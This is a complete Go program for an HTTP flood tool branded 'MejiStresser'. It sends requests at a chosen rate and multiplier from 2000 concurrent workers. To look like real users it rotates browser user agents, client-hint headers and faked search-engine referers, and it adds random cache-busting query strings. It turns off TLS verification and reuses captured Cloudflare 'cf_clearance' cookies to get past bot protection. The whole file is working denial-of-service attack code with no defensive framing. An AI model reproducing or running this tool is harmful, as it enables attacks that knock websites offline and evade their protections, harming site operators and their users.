package main

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

func randomString(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

func processURL(target string) string {
	// 1. Handle %RAND% placeholder (Global replacement)
	for strings.Contains(target, "%RAND%") {
		target = strings.Replace(target, "%RAND%", randomString(8), 1)
	}

	// 2. Inject MejiStresser Branding into Path/Query
	// We check for signature specifically in the path/query part to avoid domain name collisions
	uBody := target
	if idx := strings.Index(target, "://"); idx != -1 {
		uBody = target[idx+3:]
	}

	firstSlash := strings.Index(uBody, "/")
	hasMeji := false

	if firstSlash != -1 {
		pathPart := uBody[firstSlash:]
		if strings.Contains(pathPart, "mejistresser") {
			hasMeji = true
		}
	}

	if !hasMeji {
		if strings.Contains(target, "?") {
			// Jika sudah ada query, sisipkan di awal query
			target = strings.Replace(target, "?", "?mejistresser=attack&", 1)
		} else {
			// Jika belum ada query, jadikan path
			if strings.HasSuffix(target, "/") {
				target += "mejistresser"
			} else {
				target += "/mejistresser"
			}
		}
	}

	// 3. Automatic Cache-Busting (Random Query)
	separator := "?"
	if strings.Contains(target, "?") {
		separator = "&"
	}
	return target + separator + randomString(5) + "=" + randomString(12)
}

var (
	userAgents = map[string]map[string][]string{
		"chrome": {
			"windows": {
				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
				"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
			},
			"macos": {
				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
			},
			"linux": {
				"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
				"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
			},
			"android": {
				"Mozilla/5.0 (Linux; Android 14; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
				"Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
			},
			"iphone": {
				"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/124.0.0.0 Mobile/15E148 Safari/604.1",
				"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/123.0.0.0 Mobile/15E148 Safari/604.1",
			},
		},
		"firefox": {
			"windows": {
				"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
				"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
			},
			"macos": {
				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0",
				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0",
			},
			"linux": {
				"Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
				"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
			},
		},
		"edge": {
			"windows": {
				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
			},
		},
		"opera": {
			"windows": {
				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 OPR/109.0.0.0",
			},
		},
	}
	referers = map[string][]string{
		"google": {
			"https://www.google.com/",
			"https://www.google.com/search?q=mejistresser",
			"https://www.google.co.id/",
			"https://www.google.co.uk/",
		},
		"bing": {
			"https://www.bing.com/",
			"https://www.bing.com/search?q=stress+test",
			"https://www.bing.com/news",
		},
		"yandex": {
			"https://yandex.com/",
			"https://yandex.ru/",
			"https://yandex.com/search/?text=meji",
		},
		"brave": {
			"https://search.brave.com/",
			"https://search.brave.com/search?q=high+rps+golang",
		},
		"facebook": {
			"https://www.facebook.com/",
			"https://l.facebook.com/l.php?u=https://mejistresser.net",
		},
		"twitter": {
			"https://t.co/",
			"https://twitter.com/",
		},
	}
)

type statsType struct {
	total   int64
	success int64
	failed  int64
}

var stats statsType

func buildClient(protocol string) *http.Client {
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
	}

	switch protocol {
	case "tlsv1.0":
		tlsConfig.MinVersion = tls.VersionTLS10
		tlsConfig.MaxVersion = tls.VersionTLS10
	case "tlsv1.1":
		tlsConfig.MinVersion = tls.VersionTLS11
		tlsConfig.MaxVersion = tls.VersionTLS11
	case "tlsv1.2":
		tlsConfig.MinVersion = tls.VersionTLS12
		tlsConfig.MaxVersion = tls.VersionTLS12
	case "tlsv1.3":
		tlsConfig.MinVersion = tls.VersionTLS13
		tlsConfig.MaxVersion = tls.VersionTLS13
	default:
		tlsConfig.MinVersion = tls.VersionTLS12
	}

	return &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: tlsConfig,
			DialContext: (&net.Dialer{
				Timeout:   5 * time.Second,
				KeepAlive: 30 * time.Second,
			}).DialContext,
			MaxIdleConns:        0,
			MaxIdleConnsPerHost: 10000,
			IdleConnTimeout:     90 * time.Second,
		},
		Timeout: 10 * time.Second,
	}
}

func getRandFromMap(m map[string][]string, key string) string {
	var pool []string
	if val, ok := m[key]; ok {
		pool = val
	} else {
		// Mixed/Random
		for _, v := range m {
			pool = append(pool, v...)
		}
	}
	if len(pool) == 0 {
		return ""
	}
	return pool[rand.Intn(len(pool))]
}

func getUA(browser, osType string) string {
	bPool := userAgents[browser]
	if bPool == nil {
		keys := []string{"chrome", "firefox", "edge"}
		browser = keys[rand.Intn(len(keys))]
		bPool = userAgents[browser]
	}

	oPool := bPool[osType]
	if oPool == nil {
		// Pick a random OS from the available ones for this browser
		var availableOS []string
		for k := range bPool {
			availableOS = append(availableOS, k)
		}
		if len(availableOS) > 0 {
			oPool = bPool[availableOS[rand.Intn(len(availableOS))]]
		}
	}

	if len(oPool) == 0 {
		return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
	}
	return oPool[rand.Intn(len(oPool))]
}

func setRealisticHeaders(req *http.Request, browser, osType, ua string) {
	req.Header.Set("User-Agent", ua)

	// Default Sec-CH-UA logic
	if strings.Contains(ua, "Chrome") {
		req.Header.Set("Sec-Ch-Ua", `"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"`)
	} else if strings.Contains(ua, "Edg") {
		req.Header.Set("Sec-Ch-Ua", `"Chromium";v="124", "Microsoft Edge";v="124", "Not-A.Brand";v="99"`)
	}

	req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
	if osType == "android" || osType == "iphone" {
		req.Header.Set("Sec-Ch-Ua-Mobile", "?1")
	}

	platformMap := map[string]string{
		"windows": `"Windows"`,
		"macos":   `"macOS"`,
		"linux":   `"Linux"`,
		"android": `"Android"`,
		"iphone":  `"iOS"`,
	}
	if p, ok := platformMap[osType]; ok {
		req.Header.Set("Sec-Ch-Ua-Platform", p)
	}

	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9,id;q=0.8")
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "none")
	req.Header.Set("Sec-Fetch-User", "?1")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("X-Powered-By", "MejiStresser")
}

var (
	globalClearance atomic.Value
)

func makeRequest(client *http.Client, target, method, browser, osType, referer string) bool {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	finalURL := processURL(target)
	req, err := http.NewRequestWithContext(ctx, method, finalURL, nil)
	if err != nil {
		return false
	}

	ua := getUA(browser, osType)
	ref := getRandFromMap(referers, referer)

	setRealisticHeaders(req, browser, osType, ua)
	if ref != "" {
		req.Header.Set("Referer", ref)
	}
	req.Header.Set("Connection", "keep-alive")

	if val := globalClearance.Load(); val != nil {
		req.Header.Set("Cookie", val.(string))
	}

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	for _, cookie := range resp.Cookies() {
		if cookie.Name == "cf_clearance" {
			globalClearance.Store(fmt.Sprintf("cf_clearance=%s", cookie.Value))
		}
	}

	io.Copy(io.Discard, resp.Body)
	return resp.StatusCode < 500
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU())

	if len(os.Args) < 4 {
		fmt.Println("Usage: go run hrax.go <url> <time> <rate> <slot> [browser] [os] [referer] [method] [protocol]")
		fmt.Println("  url      : Target HTTPS URL                          e.g. https://example.com")
		fmt.Println("  time     : Duration in seconds                       e.g. 30")
		fmt.Println("  rate     : Requests per second                       e.g. 64")
		fmt.Println("  slot     : Multiplier for rate                       e.g. 10 (Total 640 rps)")
		fmt.Println("  browser  : chrome|firefox|edge|opera|mixed            (default: mixed)")
		fmt.Println("  os       : random|windows|macos|linux|iphone|android (default: random)")
		fmt.Println("  referer  : google|bing|yandex|brave|facebook|twitter (default: mixed)")
		fmt.Println("  method   : get|post|head|put|nonstandard             (default: get)")
		fmt.Println("  protocol : tlsv1.0|tlsv1.1|tlsv1.2|tlsv1.3|mixed     (default: mixed)")
		os.Exit(1)
	}

	target := os.Args[1]
	duration, _ := strconv.Atoi(os.Args[2])
	baseRate, _ := strconv.Atoi(os.Args[3])

	slot := 1
	if len(os.Args) > 4 {
		slot, _ = strconv.Atoi(os.Args[4])
	}

	// Slot System: rate = rate * slot
	totalRate := baseRate * slot
	if totalRate <= 0 {
		totalRate = 1
	}

	// Advanced Args (shifted because of slot)
	browser := "mixed"
	if len(os.Args) > 5 {
		browser = os.Args[5]
	}
	osType := "random"
	if len(os.Args) > 6 {
		osType = os.Args[6]
	}
	referer := "mixed"
	if len(os.Args) > 7 {
		referer = os.Args[7]
	}
	method := "GET"
	if len(os.Args) > 8 {
		method = strings.ToUpper(os.Args[8])
	}
	protocol := "mixed"
	if len(os.Args) > 9 {
		protocol = os.Args[9]
	}

	client := buildClient(protocol)
	jobs := make(chan bool, totalRate)
	var wg sync.WaitGroup

	// Gunakan 2000 worker untuk menangani perkalian slot yang besar
	numWorkers := 2000
	for w := 0; w < numWorkers; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for range jobs {
				if makeRequest(client, target, method, browser, osType, referer) {
					atomic.AddInt64(&stats.success, 1)
				} else {
					atomic.AddInt64(&stats.failed, 1)
				}
			}
		}()
	}

	fmt.Printf(`
   __  ___     _ _  ______                          
  /  |/  /__  (_) / / __/ /_________ ___ ___ ___ ____
 / /|_/ / _ \/ / / _\ \/ __/ __/ -_|_-<(_-</ -_) __/
/_/  /_/\___/_/_/ /___/\__/_/  \__/___/___/\__/_/   
                                                    
  [ Engine: GOLANG | Slot System Enabled ]
  ──────────────────────────────────────────────────
  Target:      %s
  Method:      %s
  Duration:    %ds
  Base Rate:   %d rps
  Slots:       %d
  Total RPS:   %d
  ──────────────────────────────────────────────────
`, target, method, duration, baseRate, slot, totalRate)

	start := time.Now()
	ticker := time.NewTicker(time.Second / time.Duration(totalRate))
	deadline := time.After(time.Duration(duration) * time.Second)

loop:
	for {
		select {
		case <-deadline:
			break loop
		case <-ticker.C:
			atomic.AddInt64(&stats.total, 1)
			select {
			case jobs <- true:
			default:
			}
		}
	}

	ticker.Stop()
	close(jobs)
	wg.Wait()

	elapsed := time.Since(start).Seconds()
	fmt.Printf("\nDone. Success: %d, Failed: %d, Avg: %.2f rps\n", stats.success, stats.failed, float64(stats.success)/elapsed)
}
